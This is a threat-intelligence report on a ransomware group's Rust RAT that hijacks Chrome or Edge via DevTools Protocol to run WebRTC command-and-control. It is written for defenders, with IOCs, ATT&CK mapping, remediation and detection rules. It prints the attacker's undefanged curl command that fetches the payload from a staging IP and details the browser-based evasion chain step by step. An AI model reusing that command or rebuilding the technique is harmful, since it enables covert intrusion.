# Technical Analysis Report: Chaos msaRAT Browser-Based C2 (2026-07-26)

Prepared by: Actioner
Classification: TLP:WHITE
Date: 2026-07-26
Version: FINAL

## Executive Summary

The Chaos ransomware group has deployed a novel Rust-based remote access trojan designated **msaRAT** that establishes covert command-and-control channels by hijacking legitimate Chromium-based browsers (Chrome/Edge) via the Chrome DevTools Protocol (CDP). The RAT launches the browser in headless mode with remote debugging enabled, injects JavaScript to create WebRTC DataChannels, and routes all C2 traffic through Twilio TURN relays and Cloudflare Workers infrastructure. Because the malware itself never touches the network directly -- all external communications originate from the browser process -- traditional network monitoring sees only legitimate browser traffic to Cloudflare and Twilio endpoints. The payload is delivered as an MSI installer (`update_ms.msi`) disguised as a Windows Update, with the RAT DLL loaded directly into memory via an MSI custom action. Data in transit is double-encrypted: ChaCha-Poly1305 over DTLS (handled natively by the browser's WebRTC stack).

This technique represents a significant evolution in "living-off-the-browser" tradecraft, making network-level detection extremely difficult. Host-based detection focusing on headless browser launch flags and the distinctive CDP callback bindings remains the most reliable approach.

## Background: Chaos Ransomware Group

Chaos (also tracked as ChaosRaaS) is a ransomware-as-a-service operation that has historically relied on commodity tooling for post-compromise access. The introduction of msaRAT marks a shift toward custom-built, evasion-focused implants. The RAT is written in Rust atop the Tokio asynchronous runtime, indicating investment in modern, performant malware development. Initial access in observed campaigns leveraged spam and vishing (voice-based social engineering) to deliver RMM tools or file-sharing software, after which operators manually deployed msaRAT.

## Attack Timeline (All Times UTC)

| Timestamp | Event |
|-----------|-------|
| 2026-07 (est.) | Cisco Talos identifies msaRAT samples in active Chaos ransomware operations |
| 2026-07-23 | Cisco Talos publishes full technical analysis of msaRAT |

## Root Cause: Post-Compromise Manual Deployment

msaRAT is deployed post-compromise. The attacker, having gained interactive access via social engineering and RMM tools, manually downloads and executes the MSI payload using curl:

```
curl.exe http://172.86.126.18:443/update_ms.msi -o C:\programdata\update_ms.msi
```

Notably, the download uses HTTP (not HTTPS) over port 443, likely to bypass protocol-agnostic firewall rules that allow outbound 443 traffic.

## Technical Analysis of the Malicious Payload

### 1. MSI Delivery and In-Memory DLL Loading

The payload arrives as `update_ms.msi`, an MSI installer with spoofed Windows Update properties. The embedded DLL (`lib.dll`) is stored in the MSI Binary table under the identifier `Bin_lib_EA2AEBC3`. A custom action `CA_Run_EA2AEBC3` triggers at the `InstallFinalize` phase, loading the DLL directly into memory without writing it to disk. The DLL exports a single function: `RUN`.

### 2. Rust Runtime Initialization and Browser Discovery

Upon execution, msaRAT initializes a Tokio asynchronous runtime, configuring worker threads based on CPU count (determined via `GetSystemInfo` API). The runtime respects the `TOKIO_WORKER_THREADS` environment variable. The RAT then locates a Chromium-based browser in this priority order:

1. Environment variables: `CHROME_EXECUTABLE`, `EDGE_EXECUTABLE`, `PROGRAMFILES`, `PROGRAMFILES(x86)`
2. Registry fallback: Chrome-specific registry keys

### 3. Chrome DevTools Protocol Hijacking

msaRAT launches the discovered browser (Chrome or Edge) with the following flags:
- `--headless` (no visible GUI)
- `--remote-debugging-port` (enables CDP)
- `--user-data-dir` (separate profile directory to circumvent Chrome 136+ profile protections)

The RAT connects to the browser's debugging interface by querying `GET /json/list/` on localhost, extracting the `webSocketDebuggerUrl` field, and establishing a WebSocket connection. It then sends a sequence of CDP commands:

1. `Target.createTarget` -- create a new browser tab
2. `Page.enable` -- activate page domain events
3. `Runtime.enable` -- activate runtime domain
4. `Page.setBypassCSP` -- bypass Content Security Policy
5. `Runtime.addBinding` -- register five callback bindings: `msaOpen`, `msaClose`, `msaError`, `msaMessage`, `dataAck`
6. `Runtime.evaluate` -- inject JavaScript for WebRTC initialization

### 4. WebRTC C2 Channel via Cloudflare Workers and Twilio TURN

The injected JavaScript performs the following:

1. **ICE Server Discovery**: Sends `GET /token/v1/{UID}` to `is-01-ast[.]ols-img-12[.]workers[.]dev` with spoofed Microsoft Origin/Referer headers to retrieve STUN/TURN credentials
2. **RTCPeerConnection Setup**: Creates a WebRTC peer connection using `stun2.l.google.com` (STUN) and `global[.]turn[.]twilio[.]com` (TURN)
3. **DataChannel Creation**: Opens a DataChannel with a random 5-20 character alphanumeric identifier
4. **SDP Negotiation**: Generates an SDP Offer and POSTs it to `POST /token/v1/{UID}` on the Workers endpoint; receives an SDP Answer with `0.0.0.0` as the connection address, forcing all traffic through the Twilio TURN relay
5. **ECDH Key Exchange**: Upon connection, a handshake frame type `0xFE` initiates Elliptic Curve Diffie-Hellman key exchange
6. **Encrypted C2**: Bidirectional command channel operates over the DataChannel with ChaCha-Poly1305 encryption layered on top of the browser's native DTLS

Data is passed between the RAT and browser via CDP bindings: `window.msaMessage(base64Data)` for inbound data, and `Runtime.bindingCalled` events for outbound. A 24KB send buffer threshold manages DataChannel queue congestion.

### 5. Anti-Forensics / Evasion Techniques

- **Living-off-the-browser**: All external network traffic originates from the legitimate browser process (`chrome.exe`/`msedge.exe`), not the RAT itself
- **TURN relay enforcement**: Omitting ICE candidates in SDP Answer forces all traffic through Twilio TURN, hiding the actual C2 server IP
- **Double encryption**: ChaCha-Poly1305 over DTLS
- **Infrastructure laundering**: C2 traffic traverses Cloudflare Workers (signaling) and Twilio TURN (data), both legitimate cloud services
- **HTTP on port 443**: MSI download uses HTTP protocol on port 443 to evade port-based allow rules
- **In-memory execution**: DLL loaded directly from MSI Binary table, never written to disk
- **CSP bypass**: `Page.setBypassCSP` disables browser security controls
- **Header spoofing**: Origin and Referer headers spoofed as Microsoft official domains
- **Headless mode**: No visible browser window

## Indicators of Compromise (IOCs)

> **Defanging Convention:** All IOCs in this report use defanged notation to prevent accidental resolution or click-through:
> - URLs: `hxxps://` or `hxxp://` (e.g., `hxxps://evil[.]com/payload`)
> - Domains: `[.]` replacing dots (e.g., `evil[.]com`)
> - IP addresses: `[.]` replacing dots (e.g., `1[.]2[.]3[.]4`)

### Package / Software Level

| Package / Component | Malicious Version | Description |
|---------------------|-------------------|-------------|
| `update_ms.msi` | N/A | MSI installer masquerading as Windows Update, carries msaRAT DLL in Binary table |

### File System

| Platform | Path | Hash (SHA256) | Description |
|----------|------|---------------|-------------|
| Windows | `C:\programdata\update_ms.msi` | Not published | MSI payload download location |
| Windows (in-memory) | `lib.dll` (MSI Binary table: `Bin_lib_EA2AEBC3`) | Not published | msaRAT DLL loaded via custom action `CA_Run_EA2AEBC3` |

### Network

| Type | Value | Context |
|------|-------|---------|
| IP | `172[.]86[.]126[.]18:443` | Staging server -- MSI payload download (HTTP on port 443) |
| Domain | `is-01-ast[.]ols-img-12[.]workers[.]dev` | Cloudflare Workers -- WebRTC signaling/SDP negotiation |
| Domain | `stun2[.]l[.]google[.]com` | STUN server for NAT traversal (legitimate Google infra) |
| Domain | `global[.]turn[.]twilio[.]com` | TURN relay for WebRTC data channel (legitimate Twilio infra) |
| URL Pattern | `hxxp://172[.]86[.]126[.]18:443/update_ms.msi` | MSI payload download URL |
| URL Pattern | `GET /token/v1/{UID}` | Workers endpoint -- retrieve STUN/TURN configuration |
| URL Pattern | `POST /token/v1/{UID}` | Workers endpoint -- WebRTC SDP offer/answer exchange |
| URL Pattern | `GET /json/list/` | Localhost CDP endpoint -- browser target enumeration |

### Behavioral

- **Process chain**: MSI installer executes custom action `CA_Run_EA2AEBC3` which loads `lib.dll` and calls export `RUN`, initializes Tokio runtime, spawns `chrome.exe` or `msedge.exe` with `--headless --remote-debugging-port --user-data-dir` flags
- **Command execution**: `cmd.exe /e:ON /v:OFF /d /c <cmd>` for shell commands
- **CDP bindings**: Five distinctive callback names registered via `Runtime.addBinding`: `msaOpen`, `msaClose`, `msaError`, `msaMessage`, `dataAck`
- **WebRTC DataChannel**: Random 5-20 character alphanumeric channel names
- **ICE candidate suppression**: SDP Answer contains `0.0.0.0` to force TURN relay
- **Send buffer management**: 24KB DataChannel queue threshold
- **User-Agent**: `HeadlessChrome` visible in HTTP requests from the headless browser
- **Environment variable**: `TOKIO_WORKER_THREADS` checked for Tokio runtime configuration

## MITRE ATT&CK Mapping

| TID | Technique | Observed Behavior |
|-----|-----------|-------------------|
| T1566.004 | Phishing: Spearphishing Voice | Vishing/spam delivers RMM tools leading to manual payload deployment |
| T1204.002 | User Execution: Malicious File | Victim executes RMM tool / attacker runs MSI via curl |
| T1105 | Ingress Tool Transfer | `curl.exe` downloads `update_ms.msi` from staging server |
| T1036.005 | Masquerading: Match Legitimate Name or Location | MSI spoofs Windows Update properties |
| T1059 | Command and Scripting Interpreter | `cmd.exe /e:ON /v:OFF /d /c` for command execution |
| T1106 | Native API | `GetSystemInfo`, `CreateThread` for runtime initialization |
| T1218.007 | System Binary Proxy Execution: Msiexec | MSI custom action loads DLL payload |
| T1219 | Remote Access Software | msaRAT provides full remote access via browser-based C2 |
| T1071.001 | Application Layer Protocol: Web Protocols | C2 over WebRTC/HTTPS through Cloudflare Workers |
| T1090.002 | Proxy: External Proxy | Traffic relayed through Twilio TURN infrastructure |
| T1573.001 | Encrypted Channel: Symmetric Cryptography | ChaCha-Poly1305 encryption over DTLS |
| T1140 | Deobfuscate/Decode Files or Information | Base64 encoding for CDP data transfer |

## Impact Assessment

msaRAT represents a significant escalation in browser-based C2 tradecraft. The technique is platform-dependent (requires Chrome or Edge) but broadly applicable given Chrome's near-ubiquitous install base on Windows systems. Detection is challenging because: (1) all network traffic originates from the browser process, (2) destinations are legitimate cloud services (Cloudflare, Twilio, Google), and (3) traffic is encrypted at multiple layers. Talos describes this as "tradecraft rather than measured campaign," meaning indicators are readily rotatable by operators. The behavioral pattern of headless browser spawning with debugging flags remains the durable detection vector.

## Detection & Remediation

### Immediate Detection

- Search process creation logs for `chrome.exe` or `msedge.exe` spawned with both `--headless` and `--remote-debugging-port` flags, especially from non-interactive parent processes
- Search for `curl.exe` downloading `.msi` files to `C:\programdata\`
- Search DNS logs for queries to `is-01-ast[.]ols-img-12[.]workers[.]dev`
- Search for outbound connections to `172[.]86[.]126[.]18`
- Scan for files matching ClamAV signature `Win.Downloader.ChaosRaas-10060321-0`

### Remediation

1. **Containment**: Isolate affected hosts; terminate headless browser processes with debugging flags
2. **Eradication**: Remove `C:\programdata\update_ms.msi` and any associated MSI installation artifacts; revoke credentials used on compromised systems
3. **Recovery**: Reimage affected systems; rotate all credentials and tokens that were accessible from compromised hosts
4. **RMM Audit**: Review all remote management tool installations for unauthorized access vectors

### Long-Term Hardening

- Monitor for headless browser execution with remote debugging flags as a persistent detection (application allowlisting can restrict which processes may launch browsers with debugging flags)
- Block or alert on `workers.dev` domains not explicitly approved for business use (advisory -- efficacy depends on whether legitimate Cloudflare Workers are in use)
- Consider restricting `curl.exe` and `certutil.exe` execution to approved users/processes via application control policies

## Detection Rules

These detections target the Chaos msaRAT payload delivery, C2 infrastructure, and browser hijacking behavior. Most rules operate at PoC/advisory-specific altitude keyed on campaign IOCs; Rule 3 (Headless Browser Launch) is a supplementary behavioral detection that covers the broader TTP and is useful as a long-term durable signal beyond rotatable indicators. Sigma rules convert cleanly to Splunk and CrowdStrike LogScale. Compiles does not equal fires -- verify in your pipeline with representative telemetry.

### Sigma: Chaos msaRAT MSI Payload Delivery via Curl
Detects the specific curl command pattern used to download the msaRAT MSI payload to ProgramData.
**Status:** compile ✅ compiles · confidence: high
<!-- audit: sigma check 0 (--exclude attacktag, MITRE data fetch blocked by proxy); splunk convert 0; log_scale convert 0. Keys on distinctive filename+path combination from observed campaign delivery. FP: legitimate MSI deployment to ProgramData via curl is uncommon but possible in enterprise automation. -->
```yaml
title: Chaos msaRAT MSI Payload Delivery via Curl
id: 7a3e1c4b-9f2d-4e8a-b5c6-d1f0e3a7b294
status: experimental
description: >
    Detects curl.exe downloading the msaRAT MSI payload (update_ms.msi) to C:\programdata,
    consistent with the Chaos ransomware group's observed delivery technique.
references:
    - https://blog.talosintelligence.com/chaos-msarat-living-off-the-browser-to-build-covert-c2-channel/
author: Actioner
date: 2026/07/26
tags:
    - attack.t1105
logsource:
    category: process_creation
    product: windows
detection:
    selection_curl:
        Image|endswith: '\curl.exe'
    selection_target:
        CommandLine|contains|all:
            - 'update_ms.msi'
            - '\programdata'
    condition: selection_curl and selection_target
falsepositives:
    - Legitimate software deployment scripts downloading MSI packages to ProgramData
level: high
```

### Sigma: Chaos msaRAT Cloudflare Workers C2 DNS Query
Detects DNS queries to the specific Cloudflare Workers subdomain used for msaRAT WebRTC signaling.
**Status:** compile ✅ compiles · confidence: high
<!-- audit: sigma check 0 (--exclude attacktag); splunk convert 0; log_scale convert 0. IOC-anchored on specific attacker-controlled Workers subdomain. Domain is operator-rotatable; re-evaluate if new infrastructure identified. -->
```yaml
title: Chaos msaRAT Cloudflare Workers C2 DNS Query
id: 8b4f2d5c-a03e-4f9b-c6d7-e2a1f4b8c305
status: experimental
description: >
    Detects DNS queries to the Cloudflare Workers domain used by msaRAT for WebRTC
    signaling and C2 SDP negotiation.
references:
    - https://blog.talosintelligence.com/chaos-msarat-living-off-the-browser-to-build-covert-c2-channel/
author: Actioner
date: 2026/07/26
tags:
    - attack.t1071.001
logsource:
    category: dns_query
detection:
    selection:
        QueryName|endswith: 'is-01-ast.ols-img-12.workers.dev'
    condition: selection
falsepositives:
    - Unlikely - this is a specific attacker-controlled Cloudflare Workers subdomain
level: critical
```

### Sigma: Headless Browser Launch with Remote Debugging Port
Detects Chrome or Edge launched in headless mode with remote debugging enabled, as used by msaRAT for browser-based C2.
**Status:** compile ✅ compiles · confidence: medium
<!-- audit: sigma check 0 (--exclude attacktag); splunk convert 0; log_scale convert 0. Borderline specific/behavioral: the flag combination is distinctive but also used by legitimate browser automation (Selenium, Puppeteer, Playwright). Confidence capped at medium due to automation tool FP surface. Pair with network or parent-process context for higher fidelity in noisy environments. -->
```yaml
title: Headless Browser Launch with Remote Debugging Port
id: 9c5a3e6d-b14f-4a0c-d7e8-f3b2a5c9d416
status: experimental
description: >
    Detects Chrome or Edge launched in headless mode with remote debugging enabled,
    a technique used by msaRAT to establish browser-based C2 via Chrome DevTools Protocol.
references:
    - https://blog.talosintelligence.com/chaos-msarat-living-off-the-browser-to-build-covert-c2-channel/
author: Actioner
date: 2026/07/26
tags:
    - attack.t1219
logsource:
    category: process_creation
    product: windows
detection:
    selection_browser:
        Image|endswith:
            - '\chrome.exe'
            - '\msedge.exe'
    selection_flags:
        CommandLine|contains|all:
            - '--headless'
            - '--remote-debugging-port'
    condition: selection_browser and selection_flags
falsepositives:
    - Browser automation tools (Selenium, Puppeteer, Playwright)
    - Automated testing frameworks
    - Web scraping utilities
level: medium
```

### Snort: Chaos msaRAT MSI Download from Known C2 Server
Detects HTTP GET requests for the msaRAT MSI payload directed at the known staging server IP.
**Status:** compile ✅ compiles · confidence: high
<!-- audit: snort 2.9.20 -T 0 via test config with classification.config. Keys on destination IP 172.86.126.18 + filename content match. IP is operator-rotatable. -->
```snort
alert tcp $HOME_NET any -> 172.86.126.18 443 (msg:"Actioner - Chaos msaRAT MSI Payload Download from Known C2"; flow:established,to_server; content:"GET"; content:"/update_ms.msi"; nocase; classtype:trojan-activity; reference:url,blog.talosintelligence.com/chaos-msarat-living-off-the-browser-to-build-covert-c2-channel/; sid:2100101; rev:1;)
```

### Suricata: Chaos msaRAT Cloudflare Workers C2 DNS Query
Detects DNS queries for the specific Cloudflare Workers subdomain used by msaRAT for signaling.
**Status:** compile ✅ compiles · confidence: high
<!-- audit: suricata 7.0.3 -T 0. IOC-anchored on attacker-controlled Workers subdomain. Operator-rotatable infrastructure. -->
```suricata
alert dns $HOME_NET any -> any any (msg:"Actioner - Chaos msaRAT Cloudflare Workers C2 DNS Query"; flow:to_server; dns.query; content:"is-01-ast.ols-img-12.workers.dev"; nocase; fast_pattern; classtype:trojan-activity; reference:url,blog.talosintelligence.com/chaos-msarat-living-off-the-browser-to-build-covert-c2-channel/; metadata:author Actioner, created_at 2026-07-26; sid:2200101; rev:1;)
```

### Suricata: Chaos msaRAT Cloudflare Workers C2 TLS SNI
Detects TLS connections with SNI matching the msaRAT Cloudflare Workers C2 endpoint.
**Status:** compile ✅ compiles · confidence: high
<!-- audit: suricata 7.0.3 -T 0. Complements DNS rule for environments where DNS logging is limited but TLS inspection is available. Same IOC rotation caveat applies. -->
```suricata
alert tls $HOME_NET any -> $EXTERNAL_NET any (msg:"Actioner - Chaos msaRAT Cloudflare Workers C2 TLS SNI"; flow:established,to_server; tls.sni; content:"is-01-ast.ols-img-12.workers.dev"; nocase; fast_pattern; classtype:trojan-activity; reference:url,blog.talosintelligence.com/chaos-msarat-living-off-the-browser-to-build-covert-c2-channel/; metadata:author Actioner, created_at 2026-07-26; sid:2200102; rev:1;)
```

### YARA: Chaos msaRAT DLL Payload
Detects the msaRAT DLL via its distinctive CDP callback binding names (`msaOpen`, `msaClose`, `msaError`, `msaMessage`, `dataAck`) combined with Rust/Tokio runtime strings.
**Status:** compile ✅ compiles · confidence: high · sample: constructed
<!-- audit: yarac 0. yara fired on constructed positive (MZ header + 3 binding strings + CDP + Tokio); quiet on negative (MZ header only). Strings sourced from Talos report's CDP binding analysis. Constructed sample, not confirmed upstream malware binary. -->
```yara
rule Malware_Chaos_msaRAT_DLL_Payload
{
    meta:
        description = "Detects the Chaos msaRAT DLL payload via distinctive CDP callback binding names and Rust/Tokio runtime strings"
        author = "Actioner"
        date = "2026-07-26"
        reference = "https://blog.talosintelligence.com/chaos-msarat-living-off-the-browser-to-build-covert-c2-channel/"
        severity = "high"

    strings:
        $bind1 = "msaOpen" ascii wide
        $bind2 = "msaClose" ascii wide
        $bind3 = "msaError" ascii wide
        $bind4 = "msaMessage" ascii wide
        $bind5 = "dataAck" ascii wide

        $cdp1 = "Runtime.addBinding" ascii
        $cdp2 = "Page.setBypassCSP" ascii
        $cdp3 = "Runtime.evaluate" ascii
        $cdp4 = "Target.createTarget" ascii

        $rust1 = "TOKIO_WORKER_THREADS" ascii
        $rust2 = "the number of hardware threads is not known for the target platform" ascii

        $export = "RUN" ascii fullword

    condition:
        uint16(0) == 0x5A4D and
        filesize < 10MB and
        (
            (3 of ($bind*)) or
            (2 of ($bind*) and 1 of ($cdp*)) or
            (2 of ($bind*) and $export and 1 of ($rust*))
        )
}
```

## Lessons Learned

msaRAT demonstrates that browser-based C2 is no longer theoretical. By "living off the browser," the RAT makes its network traffic indistinguishable from legitimate browsing at the packet level -- all connections go to Google, Cloudflare, and Twilio infrastructure. Traditional network detection based on destination reputation or protocol anomalies is ineffective here. Defenders should prioritize host-based visibility: monitoring process creation for headless browser launches with debugging flags, auditing CDP WebSocket connections on localhost, and correlating MSI installation activity with unusual browser spawning. The technique is inherently tied to the presence of Chromium browsers, but given Chrome's install base, this is not a meaningful limitation for attackers.

## Sources

- [Cisco Talos Blog - Chaos msaRAT: Living off the browser to build covert C2 channel](https://blog.talosintelligence.com/chaos-msarat-living-off-the-browser-to-build-covert-c2-channel/) — primary technical analysis with full attack chain, CDP command sequences, and WebRTC C2 architecture
- [The Hacker News - Chaos Ransomware Uses msaRAT to Route C2](https://thehackernews.com/2026/07/chaos-ransomware-uses-msarat-to-route.html) — supplementary coverage with additional command execution details (`cmd.exe /e:ON /v:OFF /d /c`)
- [Security Affairs - Chaos Ransomware Deploys Browser-Based msaRAT](https://securityaffairs.com/195876/malware/chaos-ransomware-deploys-browser-based-msarat-to-evade-network-detection.html) — supplementary coverage confirming evasion capabilities and detection indicators

---
*Report generated by Actioner*
